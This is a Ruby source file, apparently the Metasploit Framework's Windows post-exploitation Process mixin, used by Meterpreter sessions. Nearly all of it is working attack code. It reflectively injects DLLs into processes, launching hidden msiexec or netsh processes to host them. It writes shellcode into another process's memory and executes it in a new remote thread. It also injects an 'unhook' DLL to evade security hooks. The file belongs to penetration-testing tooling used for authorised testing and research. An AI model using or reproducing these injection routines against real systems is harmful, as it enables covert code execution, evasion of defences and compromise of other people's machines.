# -*- coding: binary -*-


module Msf
class Post
module Windows

module Process

  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Post::Process

  def initialize(info = {})
    super(
      update_info(
        info,
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_*
              stdapi_sys_process_*
            ]
          }
        }
      )
    )
  end

  # Checks the architecture of a payload and PID are compatible
  # Returns true if they are false if they are not
  def arch_check(test_arch, pid)
    # get the pid arch
    client.sys.process.processes.each do |p|
      # Check Payload Arch
      if pid == p["pid"]
        return test_arch == p['arch']
      end
    end
  end

  # returns the path to the notepad process based on syswow extension
  def get_notepad_pathname(bits, windir, client_arch)
    if bits == ARCH_X86 and client_arch == ARCH_X86
      cmd = "#{windir}\\System32\\notepad.exe"
    elsif bits == ARCH_X64 and client_arch == ARCH_X64
      cmd = "#{windir}\\System32\\notepad.exe"
    elsif bits == ARCH_X64 and client_arch == ARCH_X86
      cmd = "#{windir}\\Sysnative\\notepad.exe"
    elsif bits == ARCH_X86 and client_arch == ARCH_X64
      cmd = "#{windir}\\SysWOW64\\notepad.exe"
    end
    return cmd
  end

  #
  # Injects a reflective DLL into a process, and executes it.
  #
  # @param rdll_path [String] The path to the DLL to inject
  # @param param     [String, Integer, nil] The parameter to pass to the DLL's entry point. If this value is a String
  #   then it will first be written into the process memory and then passed by reference. If the value is an Integer,
  #   then the value will be passed as is. If the value is nil, it'll be passed as a NULL pointer.
  # @param pid       [Integer] The process ID to inject to, if unspecified, a new instance of a random EXE from the
  #   process_list array will be launched to host the injected DLL.
  def execute_dll(rdll_path, param=nil, pid=nil)
    process_list = ['msiexec', 'netsh']
    if pid.nil?
      # Get a random process from the process list to spawn.
      process_cmd = process_list.sample

      # Use Rex's PeParsey as per Spencer's suggestion to determine the true architecture of the DLL we are injecting.
      pe = Rex::PeParsey::Pe.new_from_file(rdll_path, true)
      arch = pe.hdr.file['Machine'].value

      # If the DLL is x86 but the host architecture is x64, then launch a 32 bit WoW64 binary to inject into.
      if (arch == Rex::PeParsey::PeBase::IMAGE_FILE_MACHINE_I386) && (session.sys.config.sysinfo['Architecture'] == ARCH_X64)
        windir = session.sys.config.getenv('windir')
        process_cmd = "#{windir}\\SysWOW64\\#{process_cmd}.exe"
      end
      print_status("Launching #{process_cmd} to host the DLL...")
      host_process = client.sys.process.execute(process_cmd, nil, { 'Hidden' => true })
      begin
        process = client.sys.process.open(host_process.pid, PROCESS_ALL_ACCESS)
        print_good("Process #{process.pid} launched.")
      rescue Rex::Post::Meterpreter::RequestError
        # Reader Sandbox won't allow to create a new process:
        # stdapi_sys_process_execute: Operation failed: Access is denied.
        print_error('Operation failed. Trying to inject into the current process...')
        process = client.sys.process.open
      end
    else
      process = session.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
    end
    print_status("Reflectively injecting the DLL into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, ::File.expand_path(rdll_path))

    if param.is_a?(String)
      # if it's a string, treat it as data and copy it into the remote process then pass it by reference
      param_ptr = inject_into_process(process, param)
    elsif param.is_a?(Integer)
      param_ptr = param
    elsif param.nil?
      param_ptr = 0
    else
      raise TypeError, 'param must be a string, integer or nil'
    end

    process.thread.create(exploit_mem + offset, param_ptr)
    nil
  end

  #
  # Injects shellcode to a process, and executes it.
  #
  # @param shellcode [String] The shellcode to execute
  # @param base_addr [Integer] The base address to allocate memory
  # @param pid       [Integer] The process ID to inject to, if unspecified, the shellcode will be executed in place.
  #
  # @return [Boolean] True if successful, otherwise false
  #
  def execute_shellcode(shellcode, base_addr=nil, pid=nil)
    pid ||= session.sys.process.getpid
    host  = session.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
    if base_addr.nil?
      shell_addr = host.memory.allocate(shellcode.length)
    else
      shell_addr = host.memory.allocate(shellcode.length, nil, base_addr)
    end

    host.memory.protect(shell_addr)

    if host.memory.write(shell_addr, shellcode) < shellcode.length
      vprint_error("Failed to write shellcode")
      return false
    end

    vprint_status("Creating the thread to execute in 0x#{shell_addr.to_s(16)} (pid=#{pid.to_s})")
    thread = host.thread.create(shell_addr,0)
    unless thread.instance_of?(Rex::Post::Meterpreter::Extensions::Stdapi::Sys::Thread)
      vprint_error("Unable to create thread")
      nil
    end
    thread
  end

  def inject_unhook(proc, bits, delay_sec)
    if bits == ARCH_X64
      dll_file_name = 'x64.dll'
    elsif bits == ARCH_X86
      dll_file_name = 'x86.dll'
    else
      return false
    end
    dll_file = MetasploitPayloads.meterpreter_ext_path('unhook', dll_file_name)
    dll, offset = inject_dll_into_process(proc, dll_file)
    proc.thread.create(dll + offset, 0)
    Rex.sleep(delay_sec)
  end

end # Process
end # Windows
end # Post
end # Msf
